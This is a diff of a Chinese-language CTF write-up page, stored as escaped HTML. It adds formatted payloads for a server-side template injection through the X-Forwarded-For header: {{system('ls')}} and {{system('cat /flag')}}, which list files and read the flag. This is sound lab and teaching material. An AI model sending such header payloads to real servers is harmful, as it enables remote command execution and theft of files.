@@ -311,10 +311,14 @@ if(preg_match(&amp;quot;/or|-|\|/|\*|&amp;lt;|&amp;gt;|!|x|hex|(|)|+|select/i&am
 &lt;/div&gt;
 &lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/01/22/qtWNdmsM8lYQCvb.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;可以看到 IP 地址发生了变化，直接将 127.0.0.1 输出到了页面上；借助搜索引擎我发现一篇&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vd2FuZ3RhbnpoaS9wLzEyMjM4Nzc5Lmh0bWw=&#34;&gt;大佬的博客&lt;/span&gt;，里面实际验证了这是一种 SSTI 模板注入；&lt;/p&gt;
-&lt;p&gt;&amp;lt;li&amp;gt; 尝试构造 payload: &amp;lt;/li&amp;gt;&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;green&#34;&gt;尝试构造 payload:&lt;/span&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;X-Forwarded-For: &amp;#123;&amp;#123;system(&#34;ls&#34;)&amp;#125;&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/01/22/L7Kyc5H4ZSsqpAG.png&#34; alt=&#34;&#34; /&gt;&lt;br /&gt;
 发现 flag 文件，利用 cat 拿取 flag;&lt;/p&gt;
-&lt;p&gt;&amp;lt;li&amp;gt; 构造 payload: &amp;lt;/li&amp;gt;&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;green&#34;&gt;构造 payload:&lt;/span&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;X-Forwarded-For: &amp;#123;&amp;#123;system(&#34;cat /flag&#34;)&amp;#125;&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/01/22/ZfEkqNSDOgRCWl9.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;于是拿到了 flag, 放入题目中 sumbit;yas&lt;/p&gt;
 </content>
